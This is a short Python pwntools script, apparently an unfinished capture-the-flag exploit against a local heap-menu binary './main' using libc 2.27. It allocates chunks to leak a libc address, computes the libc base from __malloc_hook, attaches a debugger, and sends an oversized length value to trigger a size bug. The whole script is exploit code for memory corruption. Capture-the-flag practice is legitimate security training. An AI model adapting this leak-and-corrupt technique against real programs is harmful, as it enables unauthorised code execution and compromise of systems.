from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('>',str(ch))
def new(length,content,csize,code,dsize,data,ssize):
	menu(1)
	p.sendlineafter('length',str(length))
	p.sendafter('name',content)
	p.sendlineafter('size',str(csize))
	p.sendafter('Code',code)
	p.sendlineafter('size',str(dsize))
	p.sendafter('Data',data)
	p.sendlineafter('size',str(ssize))
def run(index):
	menu(2)

def show():
	menu(3)
p =process('./main')
libc =ELF('./libc-2.27.so')
new(0xF0,'FMYY',0x500,'FMYY',0x500,'FMYY',0x100)
new(0xF0,'FMYY',0x500,'\xA0',0x500,'\xA0',0x100)
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] -0x70
log.info('LIBC:\t' + hex(libc_base))
menu(1)
gdb.attach(p)
p.sendlineafter('length',str(0x800000F0))
p.interactive()
